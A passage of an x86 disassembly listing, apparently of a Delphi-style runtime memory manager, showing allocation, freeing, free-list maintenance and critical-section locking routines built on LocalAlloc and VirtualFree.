					; sub_4017D4+7Fj
		add	esp, 14h
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4017D4	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401860	proc near		; CODE XREF: sub_401F4C+14p
					; sub_4020DC+19p ...
		push	ebp
		mov	ebp, esp
		xor	edx, edx
		push	ebp
		push	offset loc_401916
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	offset CriticalSection ; lpCriticalSection
		call	InitializeCriticalSection
		cmp	ds:byte_417045,	0
		jz	short loc_40188E
		push	offset CriticalSection ; lpCriticalSection
		call	EnterCriticalSection

loc_40188E:				; CODE XREF: sub_401860+22j
		mov	eax, offset dword_4175E4
		call	sub_401224
		mov	eax, offset dword_4175F4
		call	sub_401224
		mov	eax, offset dword_417620
		call	sub_401224
		push	0FF8h		; uBytes
		push	0		; uFlags
		call	LocalAlloc
		mov	ds:hMem, eax
		cmp	ds:hMem, 0
		jz	short loc_4018F5
		mov	eax, 3

loc_4018CB:				; CODE XREF: sub_401860+7Dj
		mov	edx, ds:hMem
		xor	ecx, ecx
		mov	[edx+eax*4-0Ch], ecx
		inc	eax
		cmp	eax, 401h
		jnz	short loc_4018CB
		mov	eax, offset dword_417604
		mov	[eax+4], eax
		mov	[eax], eax
		mov	ds:dword_417610, eax
		mov	ds:byte_4175BC,	1

loc_4018F5:				; CODE XREF: sub_401860+64j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40191D

loc_401902:				; CODE XREF: sub_401860+BBj
		cmp	ds:byte_417045,	0
		jz	short loc_401915
		push	offset CriticalSection ; lpCriticalSection
		call	LeaveCriticalSection

loc_401915:				; CODE XREF: sub_401860+A9j
		retn
; ---------------------------------------------------------------------------

loc_401916:				; DATA XREF: sub_401860+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_401902
; ---------------------------------------------------------------------------

loc_40191D:				; CODE XREF: sub_401860:loc_401915j
					; DATA XREF: sub_401860+9Do
		mov	al, ds:byte_4175BC
		pop	ebp
		retn
sub_401860	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401924	proc near		; CODE XREF: sub_404E20+37p
		push	ebp
		mov	ebp, esp
		push	ebx
		cmp	ds:byte_4175BC,	0
		jz	loc_401A01
		xor	edx, edx
		push	ebp
		push	offset loc_4019FA
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		cmp	ds:byte_417045,	0
		jz	short loc_401956
		push	offset CriticalSection ; lpCriticalSection
		call	EnterCriticalSection

loc_401956:				; CODE XREF: sub_401924+26j
		mov	ds:byte_4175BC,	0
		mov	eax, ds:hMem
		push	eax		; hMem
		call	LocalFree
		xor	eax, eax
		mov	ds:hMem, eax
		mov	ebx, ds:dword_4175E4
		jmp	short loc_401989
; ---------------------------------------------------------------------------

loc_401977:				; CODE XREF: sub_401924+6Bj
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebx+8]
		push	eax		; lpAddress
		call	VirtualFree
		mov	ebx, [ebx]

loc_401989:				; CODE XREF: sub_401924+51j
		cmp	ebx, offset dword_4175E4
		jnz	short loc_401977
		mov	eax, offset dword_4175E4
		call	sub_401224
		mov	eax, offset dword_4175F4
		call	sub_401224
		mov	eax, offset dword_417620
		call	sub_401224
		mov	eax, ds:dword_4175DC
		test	eax, eax
		jz	short loc_4019CF

loc_4019B8:				; CODE XREF: sub_401924+A9j
		mov	edx, [eax]
		mov	ds:dword_4175DC, edx
		push	eax		; hMem
		call	LocalFree
		mov	eax, ds:dword_4175DC
		test	eax, eax
		jnz	short loc_4019B8

loc_4019CF:				; CODE XREF: sub_401924+92j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_401A01

loc_4019DC:				; CODE XREF: sub_401924+DBj
		cmp	ds:byte_417045,	0
		jz	short loc_4019EF
		push	offset CriticalSection ; lpCriticalSection
		call	LeaveCriticalSection

loc_4019EF:				; CODE XREF: sub_401924+BFj
		push	offset CriticalSection ; lpCriticalSection
		call	DeleteCriticalSection
		retn
; ---------------------------------------------------------------------------

loc_4019FA:				; DATA XREF: sub_401924+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4019DC
; ---------------------------------------------------------------------------

loc_401A01:				; CODE XREF: sub_401924+Bj
					; sub_401924+D5j
					; DATA XREF: ...
		pop	ebx
		pop	ebp
		retn
sub_401924	endp


; =============== S U B	R O U T	I N E =======================================


sub_401A04	proc near		; CODE XREF: sub_401B14:loc_401B75p
					; sub_401B84+23p ...
		push	ebx
		cmp	eax, ds:dword_417610
		jnz	short loc_401A16
		mov	edx, [eax+4]
		mov	ds:dword_417610, edx

loc_401A16:				; CODE XREF: sub_401A04+7j
		mov	edx, [eax+4]
		mov	ecx, [eax+8]
		cmp	ecx, 1000h
		jg	short loc_401A5C
		cmp	eax, edx
		jnz	short loc_401A3F
		test	ecx, ecx
		jns	short loc_401A2F
		add	ecx, 3

loc_401A2F:				; CODE XREF: sub_401A04+26j
		sar	ecx, 2
		mov	eax, ds:hMem
		xor	edx, edx
		mov	[eax+ecx*4-0Ch], edx
		jmp	short loc_401A63
; ---------------------------------------------------------------------------

loc_401A3F:				; CODE XREF: sub_401A04+22j
		test	ecx, ecx
		jns	short loc_401A46
		add	ecx, 3

loc_401A46:				; CODE XREF: sub_401A04+3Dj
		sar	ecx, 2
		mov	ebx, ds:hMem
		mov	[ebx+ecx*4-0Ch], edx
		mov	eax, [eax]
		mov	[edx], eax
		mov	[eax+4], edx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_401A5C:				; CODE XREF: sub_401A04+1Ej
		mov	eax, [eax]
		mov	[edx], eax
		mov	[eax+4], edx

loc_401A63:				; CODE XREF: sub_401A04+39j
		pop	ebx
		retn
sub_401A04	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401A68	proc near		; CODE XREF: sub_401BBC+11p
		mov	edx, ds:dword_417620
		jmp	short loc_401A80
; ---------------------------------------------------------------------------

loc_401A70:				; CODE XREF: sub_401A68+1Ej
		mov	ecx, [edx+8]
		cmp	eax, ecx
		jb	short loc_401A7E
		add	ecx, [edx+0Ch]
		cmp	eax, ecx
		jb	short loc_401A94

loc_401A7E:				; CODE XREF: sub_401A68+Dj
		mov	edx, [edx]

loc_401A80:				; CODE XREF: sub_401A68+6j
		cmp	edx, offset dword_417620
		jnz	short loc_401A70
		mov	ds:dword_4175C0, 3
		xor	edx, edx

loc_401A94:				; CODE XREF: sub_401A68+14j
		mov	eax, edx
		retn
sub_401A68	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401A98	proc near		; CODE XREF: sub_401BBC+74p
					; sub_401D40+68p
		push	ebx
		mov	ecx, edx
		sub	ecx, 4
		lea	ebx, [ecx+eax]
		cmp	edx, 10h
		jl	short loc_401AB5
		mov	dword ptr [ebx], 80000007h
		mov	edx, ecx
		call	sub_401C6C
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_401AB5:				; CODE XREF: sub_401A98+Cj
		cmp	edx, 4
		jl	short loc_401AC6
		mov	ecx, edx
		or	ecx, 80000002h
		mov	[eax], ecx
		mov	[ebx], ecx

loc_401AC6:				; CODE XREF: sub_401A98+20j
		pop	ebx
		retn
sub_401A98	endp


; =============== S U B	R O U T	I N E =======================================


sub_401AC8	proc near		; CODE XREF: sub_401AEC+Dp
					; sub_401CF4+36p ...
		inc	ds:dword_4175AC
		mov	edx, eax
		sub	edx, 4
		mov	edx, [edx]
		and	edx, 7FFFFFFCh
		sub	edx, 4
		add	ds:dword_4175B0, edx
		call	sub_4020DC
		retn
sub_401AC8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401AEC	proc near		; CODE XREF: sub_401BBC+8Ep
		cmp	edx, 0Ch
		jl	short loc_401AFF
		or	edx, 2
		mov	[eax], edx
		add	eax, 4
		call	sub_401AC8
		retn
; ---------------------------------------------------------------------------

loc_401AFF:				; CODE XREF: sub_401AEC+3j
		cmp	edx, 4
		jl	short loc_401B0E
		mov	ecx, edx
		or	ecx, 80000002h
		mov	[eax], ecx

loc_401B0E:				; CODE XREF: sub_401AEC+16j
		add	eax, edx
		and	dword ptr [eax], 0FFFFFFFEh
		retn
sub_401AEC	endp


; =============== S U B	R O U T	I N E =======================================


sub_401B14	proc near		; CODE XREF: sub_401D40+36p
		push	ebx
		push	esi
		mov	edx, eax
		sub	edx, 4
		mov	edx, [edx]
		mov	ecx, edx
		and	ecx, 80000002h
		cmp	ecx, 80000002h
		jz	short loc_401B37
		mov	ds:dword_4175C0, 4

loc_401B37:				; CODE XREF: sub_401B14+17j
		mov	ebx, edx
		and	ebx, 7FFFFFFCh
		sub	eax, ebx
		mov	ecx, eax
		xor	edx, [ecx]
		test	edx, 0FFFFFFFEh
		jz	short loc_401B57
		mov	ds:dword_4175C0, 5

loc_401B57:				; CODE XREF: sub_401B14+37j
		test	byte ptr [ecx],	1
		jz	short loc_401B7C
		mov	edx, eax
		sub	edx, 0Ch
		mov	esi, [edx+8]
		sub	eax, esi
		cmp	esi, [eax+8]
		jz	short loc_401B75
		mov	ds:dword_4175C0, 6

loc_401B75:				; CODE XREF: sub_401B14+55j
		call	sub_401A04
		add	ebx, esi

loc_401B7C:				; CODE XREF: sub_401B14+46j
		mov	eax, ebx
		pop	esi
		pop	ebx
		retn
sub_401B14	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401B84	proc near		; CODE XREF: sub_401D40+4Fp
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		xor	edi, edi
		mov	eax, [ebx]
		test	eax, 80000000h
		jz	short loc_401B9F
		and	eax, 7FFFFFFCh
		add	edi, eax
		add	ebx, eax
		mov	eax, [ebx]

loc_401B9F:				; CODE XREF: sub_401B84+Ej
		test	al, 2
		jnz	short loc_401BB6
		mov	esi, ebx
		mov	eax, esi
		call	sub_401A04
		mov	eax, [esi+8]
		add	edi, eax
		add	ebx, eax
		and	dword ptr [ebx], 0FFFFFFFEh

loc_401BB6:				; CODE XREF: sub_401B84+1Dj
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401B84	endp


; =============== S U B	R O U T	I N E =======================================


sub_401BBC	proc near		; CODE XREF: sub_401C6C+61p

var_1C		= byte ptr -1Ch
var_1B		= dword	ptr -1Bh
var_17		= dword	ptr -17h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF4h
		mov	edi, edx
		mov	esi, eax
		mov	[esp+1Ch+var_1C], 0
		mov	eax, esi
		call	sub_401A68
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_401C5E
		mov	ebp, [ebx+8]
		mov	eax, ebp
		add	eax, [ebx+0Ch]
		mov	edx, eax
		lea	ecx, [edi+esi]
		sub	edx, ecx
		cmp	edx, 0Ch
		jg	short loc_401BF4
		mov	edi, eax
		sub	edi, esi

loc_401BF4:				; CODE XREF: sub_401BBC+32j
		mov	eax, esi
		sub	eax, ebp
		cmp	eax, 0Ch
		jge	short loc_401C11
		lea	ecx, [esp+1Ch+var_1B]
		mov	edx, esi
		sub	edx, [ebx+8]
		add	edx, edi
		mov	eax, ebp
		call	sub_4017D4
		jmp	short loc_401C22
; ---------------------------------------------------------------------------

loc_401C11:				; CODE XREF: sub_401BBC+3Fj
		lea	ecx, [esp+1Ch+var_1B]
		mov	edx, edi
		sub	edx, 4
		lea	eax, [esi+4]
		call	sub_4017D4

loc_401C22:				; CODE XREF: sub_401BBC+53j
		mov	ebp, [esp+1Ch+var_1B]
		test	ebp, ebp
		jz	short loc_401C5E
		mov	edx, ebp
		sub	edx, esi
		mov	eax, esi
		call	sub_401A98
		mov	eax, ebp
		add	eax, [esp+1Ch+var_17]
		mov	edx, [ebx+8]
		add	edx, [ebx+0Ch]
		cmp	eax, edx
		jnb	short loc_401C4F
		lea	edx, [edi+esi]
		sub	edx, eax
		call	sub_401AEC

loc_401C4F:				; CODE XREF: sub_401BBC+87j
		lea	edx, [esp+1Ch+var_1B]
		mov	eax, ebx
		call	sub_4012E4
		mov	[esp+1Ch+var_1C], 1

loc_401C5E:				; CODE XREF: sub_401BBC+1Aj
					; sub_401BBC+6Cj
		mov	al, [esp+1Ch+var_1C]
		add	esp, 0Ch
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401BBC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401C6C	proc near		; CODE XREF: sub_401A98+16p
					; sub_401E58+BBp ...
		push	ebx
		push	esi
		push	edi
		mov	esi, edx
		mov	edi, eax
		mov	ebx, edi
		mov	[ebx+8], esi
		mov	eax, ebx
		add	eax, esi
		sub	eax, 0Ch
		mov	[eax+8], esi
		cmp	esi, 1000h
		jg	short loc_401CC1
		mov	edx, esi
		test	edx, edx
		jns	short loc_401C93
		add	edx, 3

loc_401C93:				; CODE XREF: sub_401C6C+22j
		sar	edx, 2
		mov	eax, ds:hMem
		mov	eax, [eax+edx*4-0Ch]
		test	eax, eax
		jnz	short loc_401CB3
		mov	eax, ds:hMem
		mov	[eax+edx*4-0Ch], ebx
		mov	[ebx+4], ebx
		mov	[ebx], ebx
		jmp	short loc_401CED
; ---------------------------------------------------------------------------

loc_401CB3:				; CODE XREF: sub_401C6C+35j
		mov	edx, [eax]
		mov	[ebx+4], eax
		mov	[ebx], edx
		mov	[eax], ebx
		mov	[edx+4], ebx
		jmp	short loc_401CED
; ---------------------------------------------------------------------------

loc_401CC1:				; CODE XREF: sub_401C6C+1Cj
		cmp	esi, 3C00h
		jl	short loc_401CD6
		mov	edx, esi
		mov	eax, edi
		call	sub_401BBC
		test	al, al
		jnz	short loc_401CED

loc_401CD6:				; CODE XREF: sub_401C6C+5Bj
		mov	eax, ds:dword_417610
		mov	ds:dword_417610, ebx
		mov	edx, [eax]
		mov	[ebx+4], eax
		mov	[ebx], edx
		mov	[eax], ebx
		mov	[edx+4], ebx

loc_401CED:				; CODE XREF: sub_401C6C+45j
					; sub_401C6C+53j ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401C6C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401CF4	proc near		; CODE XREF: sub_401D40+Fp
					; sub_4020DC+100p ...
		cmp	ds:dword_417614, 0
		jle	short locret_401D3D
		cmp	ds:dword_417614, 0Ch
		jge	short loc_401D12
		mov	ds:dword_4175C0, 7
		jmp	short locret_401D3D
; ---------------------------------------------------------------------------

loc_401D12:				; CODE XREF: sub_401CF4+10j
		mov	eax, ds:dword_417614
		or	eax, 2
		mov	edx, ds:dword_417618
		mov	[edx], eax
		mov	eax, ds:dword_417618
		add	eax, 4
		call	sub_401AC8
		xor	eax, eax
		mov	ds:dword_417618, eax
		xor	eax, eax
		mov	ds:dword_417614, eax

locret_401D3D:				; CODE XREF: sub_401CF4+7j
					; sub_401CF4+1Cj
		retn
sub_401CF4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_401D40	proc near		; CODE XREF: sub_401DCC+18p
					; sub_401DF8+1Dp

var_1C		= byte ptr -1Ch
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h

		push	ebx
		push	esi
		push	edi
		add	esp, 0FFFFFFF0h
		mov	esi, eax
		lea	edi, [esp+1Ch+var_1C]
		movsd
		movsd
		mov	edi, esp
		call	sub_401CF4
		lea	ecx, [esp+1Ch+var_14]
		mov	edx, edi
		mov	eax, offset dword_417620
		call	sub_401274
		mov	ebx, [esp+1Ch+var_14]
		test	ebx, ebx
		jnz	short loc_401D70
		xor	eax, eax
		jmp	short loc_401DC2
; ---------------------------------------------------------------------------

loc_401D70:				; CODE XREF: sub_401D40+2Aj
		mov	eax, [edi]
		cmp	ebx, eax
		jnb	short loc_401D80
		call	sub_401B14
		sub	[edi], eax
		add	[edi+4], eax

loc_401D80:				; CODE XREF: sub_401D40+34j
		mov	eax, [edi]
		add	eax, [edi+4]
		mov	esi, ebx
		add	esi, [esp+1Ch+var_10]
		cmp	eax, esi
		jnb	short loc_401D97
		call	sub_401B84
		add	[edi+4], eax

loc_401D97:				; CODE XREF: sub_401D40+4Dj
		mov	eax, [edi]
		add	eax, [edi+4]
		cmp	esi, eax
		jnz	short loc_401DB1
		sub	eax, 4
		mov	edx, 4
		call	sub_401A98
		sub	dword ptr [edi+4], 4

loc_401DB1:				; CODE XREF: sub_401D40+5Ej
		mov	eax, [edi]
		mov	ds:dword_417618, eax
		mov	eax, [edi+4]
		mov	ds:dword_417614, eax
		mov	al, 1

loc_401DC2:				; CODE XREF: sub_401D40+2Ej
		add	esp, 10h
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401D40	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401DCC	proc near		; CODE XREF: sub_401E58+57p

var_C		= dword	ptr -0Ch

		push	ebx
		add	esp, 0FFFFFFF8h
		mov	ebx, eax
		mov	edx, esp
		lea	eax, [ebx+4]
		call	sub_401620
		cmp	[esp+0Ch+var_C], 0
		jz	short loc_401DED
		mov	eax, esp
		call	sub_401D40
		test	al, al
		jnz	short loc_401DF1

loc_401DED:				; CODE XREF: sub_401DCC+14j
		xor	eax, eax
		jmp	short loc_401DF3
; ---------------------------------------------------------------------------

loc_401DF1:				; CODE XREF: sub_401DCC+1Fj
		mov	al, 1

loc_401DF3:				; CODE XREF: sub_401DCC+23j
		pop	ecx
		pop	edx
		pop	ebx
		retn
sub_401DCC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401DF8	proc near		; CODE XREF: sub_402280+1A4p

var_10		= dword	ptr -10h

		push	ebx
		push	esi
		add	esp, 0FFFFFFF8h
		mov	esi, edx
		mov	ebx, eax
		mov	ecx, esp
		lea	edx, [esi+4]
		mov	eax, ebx
		call	sub_4016B0
		cmp	[esp+10h+var_10], 0
		jz	short loc_401E1E
		mov	eax, esp
		call	sub_401D40
		test	al, al
		jnz	short loc_401E22

loc_401E1E:				; CODE XREF: sub_401DF8+19j
		xor	eax, eax
		jmp	short loc_401E24
; ---------------------------------------------------------------------------

loc_401E22:				; CODE XREF: sub_401DF8+24j
		mov	al, 1

loc_401E24:				; CODE XREF: sub_401DF8+28j
		pop	ecx
		pop	edx
		pop	esi
		pop	ebx
		retn
sub_401DF8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_401E2C	proc near		; CODE XREF: sub_401E58+4Ap
		xor	edx, edx
		test	eax, eax
		jns	short loc_401E35
		add	eax, 3

loc_401E35:				; CODE XREF: sub_401E2C+4j
		sar	eax, 2
		cmp	eax, 400h
		jg	short loc_401E55

loc_401E3F:				; CODE XREF: sub_401E2C+27j
		mov	edx, ds:hMem
		mov	edx, [edx+eax*4-0Ch]
		test	edx, edx
		jnz	short loc_401E55
		inc	eax
		cmp	eax, 401h
		jnz	short loc_401E3F

loc_401E55:				; CODE XREF: sub_401E2C+11j
					; sub_401E2C+1Fj
		mov	eax, edx
		retn
sub_401E2C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401E58	proc near		; CODE XREF: sub_401F4C+153p
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	esi, eax
		mov	edi, offset dword_417610
		mov	ebp, offset dword_417614

loc_401E68:				; CODE XREF: sub_401E58+6Aj
		mov	ebx, ds:dword_417608
		cmp	esi, [ebx+8]
		jle	loc_401EFB
		mov	ebx, [edi]
		mov	eax, [ebx+8]
		cmp	esi, eax
		jle	short loc_401EFB
		mov	[ebx+8], esi

loc_401E83:				; CODE XREF: sub_401E58+31j
		mov	ebx, [ebx+4]
		cmp	esi, [ebx+8]
		jg	short loc_401E83
		mov	edx, [edi]
		mov	[edx+8], eax
		cmp	ebx, [edi]
		jz	short loc_401E98
		mov	[edi], ebx
		jmp	short loc_401EFB
; ---------------------------------------------------------------------------

loc_401E98:				; CODE XREF: sub_401E58+3Aj
		cmp	esi, 1000h
		jg	short loc_401EAD
		mov	eax, esi
		call	sub_401E2C
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_401EFB

loc_401EAD:				; CODE XREF: sub_401E58+46j
		mov	eax, esi
		call	sub_401DCC
		test	al, al
		jnz	short loc_401EBF
		xor	eax, eax
		jmp	loc_401F47
; ---------------------------------------------------------------------------

loc_401EBF:				; CODE XREF: sub_401E58+5Ej
		cmp	esi, [ebp+0]
		jg	short loc_401E68
		sub	[ebp+0], esi
		cmp	dword ptr [ebp+0], 0Ch
		jge	short loc_401ED5
		add	esi, [ebp+0]
		xor	eax, eax
		mov	[ebp+0], eax

loc_401ED5:				; CODE XREF: sub_401E58+73j
		mov	eax, ds:dword_417618
		add	ds:dword_417618, esi
		mov	edx, esi
		or	edx, 2
		mov	[eax], edx
		add	eax, 4
		inc	ds:dword_4175AC
		sub	esi, 4
		add	ds:dword_4175B0, esi
		jmp	short loc_401F47
; ---------------------------------------------------------------------------

loc_401EFB:				; CODE XREF: sub_401E58+19j
					; sub_401E58+26j ...
		mov	eax, ebx
		call	sub_401A04
		mov	edx, [ebx+8]
		mov	eax, edx
		sub	eax, esi
		cmp	eax, 0Ch
		jl	short loc_401F1A
		mov	edx, ebx
		add	edx, esi
		xchg	eax, edx
		call	sub_401C6C
		jmp	short loc_401F2C
; ---------------------------------------------------------------------------

loc_401F1A:				; CODE XREF: sub_401E58+B4j
		mov	esi, edx
		cmp	ebx, [edi]
		jnz	short loc_401F25
		mov	eax, [ebx+4]
		mov	[edi], eax

loc_401F25:				; CODE XREF: sub_401E58+C6j
		mov	eax, ebx
		add	eax, esi
		and	dword ptr [eax], 0FFFFFFFEh

loc_401F2C:				; CODE XREF: sub_401E58+C0j
		mov	eax, ebx
		mov	edx, esi
		or	edx, 2
		mov	[eax], edx
		add	eax, 4
		inc	ds:dword_4175AC
		sub	esi, 4
		add	ds:dword_4175B0, esi

loc_401F47:				; CODE XREF: sub_401E58+62j
					; sub_401E58+A1j
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401E58	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F4C	proc near		; CODE XREF: sub_40245C+5Cp
					; sub_402520+5p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		cmp	ds:byte_4175BC,	0
		jnz	short loc_401F69
		call	sub_401860
		test	al, al
		jz	short loc_401F71

loc_401F69:				; CODE XREF: sub_401F4C+12j
		cmp	ebx, 7FFFFFF8h
		jle	short loc_401F7B

loc_401F71:				; CODE XREF: sub_401F4C+1Bj
		xor	eax, eax
		mov	[ebp+var_4], eax
		jmp	loc_4020CF
; ---------------------------------------------------------------------------

loc_401F7B:				; CODE XREF: sub_401F4C+23j
		xor	ecx, ecx
		push	ebp
		push	offset loc_4020C8
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		cmp	ds:byte_417045,	0
		jz	short loc_401F9C
		push	offset CriticalSection ; lpCriticalSection
		call	EnterCriticalSection

loc_401F9C:				; CODE XREF: sub_401F4C+44j
		add	ebx, 7
		and	ebx, 0FFFFFFFCh
		cmp	ebx, 0Ch
		jge	short loc_401FAC
		mov	ebx, 0Ch

loc_401FAC:				; CODE XREF: sub_401F4C+59j
		cmp	ebx, 1000h
		jg	loc_40204B
		mov	eax, ebx
		test	eax, eax
		jns	short loc_401FC1
		add	eax, 3

loc_401FC1:				; CODE XREF: sub_401F4C+70j
		sar	eax, 2
		mov	edx, ds:hMem
		mov	edx, [edx+eax*4-0Ch]
		test	edx, edx
		jz	short loc_40204B
		mov	esi, edx
		mov	eax, esi
		add	eax, ebx
		and	dword ptr [eax], 0FFFFFFFEh
		mov	eax, [edx+4]
		cmp	edx, eax
		jnz	short loc_401FFC
		mov	eax, ebx
		test	eax, eax
		jns	short loc_401FEB
		add	eax, 3

loc_401FEB:				; CODE XREF: sub_401F4C+9Aj
		sar	eax, 2
		mov	ecx, ds:hMem
		xor	edi, edi
		mov	[ecx+eax*4-0Ch], edi
		jmp	short loc_402022
; ---------------------------------------------------------------------------

loc_401FFC:				; CODE XREF: sub_401F4C+94j
		mov	ecx, ebx
		test	ecx, ecx
		jns	short loc_402005
		add	ecx, 3

loc_402005:				; CODE XREF: sub_401F4C+B4j
		sar	ecx, 2
		mov	edi, ds:hMem
		mov	[edi+ecx*4-0Ch], eax
		mov	ecx, [edx]
		mov	[ebp+var_8], ecx
		mov	ecx, [ebp+var_8]
		mov	[ecx+4], eax
		mov	ecx, [ebp+var_8]
		mov	[eax], ecx

loc_402022:				; CODE XREF: sub_401F4C+AEj
		mov	eax, esi
		mov	edx, [edx+8]
		or	edx, 2
		mov	[eax], edx
		add	eax, 4
		mov	[ebp+var_4], eax
		inc	ds:dword_4175AC
		sub	ebx, 4
		add	ds:dword_4175B0, ebx
		call	sub_403418
		jmp	loc_4020CF
; ---------------------------------------------------------------------------

loc_40204B:				; CODE XREF: sub_401F4C+66j
					; sub_401F4C+84j
		cmp	ebx, ds:dword_417614
		jg	short loc_40209D
		sub	ds:dword_417614, ebx
		cmp	ds:dword_417614, 0Ch
		jge	short loc_40206F
		add	ebx, ds:dword_417614
		xor	eax, eax
		mov	ds:dword_417614, eax

loc_40206F:				; CODE XREF: sub_401F4C+114j
		mov	eax, ds:dword_417618
		add	ds:dword_417618, ebx
		mov	edx, ebx
		or	edx, 2
		mov	[eax], edx
		add	eax, 4
		mov	[ebp+var_4], eax
		inc	ds:dword_4175AC
		sub	ebx, 4
		add	ds:dword_4175B0, ebx
		call	sub_403418
		jmp	short loc_4020CF
; ---------------------------------------------------------------------------

loc_40209D:				; CODE XREF: sub_401F4C+105j
		mov	eax, ebx
		call	sub_401E58
		mov	[ebp+var_4], eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4020CF

loc_4020B4:				; CODE XREF: sub_401F4C+181j
		cmp	ds:byte_417045,	0
		jz	short loc_4020C7
		push	offset CriticalSection ; lpCriticalSection
		call	LeaveCriticalSection

loc_4020C7:				; CODE XREF: sub_401F4C+16Fj
		retn
; ---------------------------------------------------------------------------

loc_4020C8:				; DATA XREF: sub_401F4C+32o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4020B4
; ---------------------------------------------------------------------------

loc_4020CF:				; CODE XREF: sub_401F4C+2Aj
					; sub_401F4C+FAj ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_401F4C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4020DC	proc near		; CODE XREF: sub_401AC8+1Cp
					; sub_40245C+88p ...

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		xor	eax, eax
		mov	ds:dword_4175C0, eax
		cmp	ds:byte_4175BC,	0
		jnz	short loc_402114
		call	sub_401860
		test	al, al
		jnz	short loc_402114
		mov	ds:dword_4175C0, 8
		mov	[ebp+var_4], 8
		jmp	loc_402275
; ---------------------------------------------------------------------------

loc_402114:				; CODE XREF: sub_4020DC+17j
					; sub_4020DC+20j
		xor	ecx, ecx
		push	ebp
		push	offset loc_40226E
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		cmp	ds:byte_417045,	0
		jz	short loc_402135
		push	offset CriticalSection ; lpCriticalSection
		call	EnterCriticalSection

loc_402135:				; CODE XREF: sub_4020DC+4Dj
		mov	esi, ebx
		sub	esi, 4
		mov	ebx, [esi]
		test	bl, 2
		jnz	short loc_402150
		mov	ds:dword_4175C0, 9
		jmp	loc_402245
; ---------------------------------------------------------------------------

loc_402150:				; CODE XREF: sub_4020DC+63j
		dec	ds:dword_4175AC
		mov	eax, ebx
		and	eax, 7FFFFFFCh
		sub	eax, 4
		sub	ds:dword_4175B0, eax
		test	bl, 1
		jz	short loc_4021B0
		mov	eax, esi
		sub	eax, 0Ch
		mov	edx, [eax+8]
		cmp	edx, 0Ch
		jl	short loc_402180
		test	edx, 80000003h
		jz	short loc_40218F

loc_402180:				; CODE XREF: sub_4020DC+9Aj
		mov	ds:dword_4175C0, 0Ah
		jmp	loc_402245
; ---------------------------------------------------------------------------

loc_40218F:				; CODE XREF: sub_4020DC+A2j
		mov	eax, esi
		sub	eax, edx
		cmp	edx, [eax+8]
		jz	short loc_4021A7
		mov	ds:dword_4175C0, 0Ah
		jmp	loc_402245
; ---------------------------------------------------------------------------

loc_4021A7:				; CODE XREF: sub_4020DC+BAj
		add	ebx, edx
		mov	esi, eax
		call	sub_401A04

loc_4021B0:				; CODE XREF: sub_4020DC+8Dj
		and	ebx, 7FFFFFFCh
		mov	eax, esi
		add	eax, ebx
		mov	edi, eax
		cmp	edi, ds:dword_417618
		jnz	short loc_4021F0
		sub	ds:dword_417618, ebx
		add	ds:dword_417614, ebx
		cmp	ds:dword_417614, 3C00h
		jle	short loc_4021E1
		call	sub_401CF4

loc_4021E1:				; CODE XREF: sub_4020DC+FEj
		xor	eax, eax
		mov	[ebp+var_4], eax
		call	sub_403418
		jmp	loc_402275
; ---------------------------------------------------------------------------

loc_4021F0:				; CODE XREF: sub_4020DC+E6j
		mov	edx, [eax]
		test	dl, 2
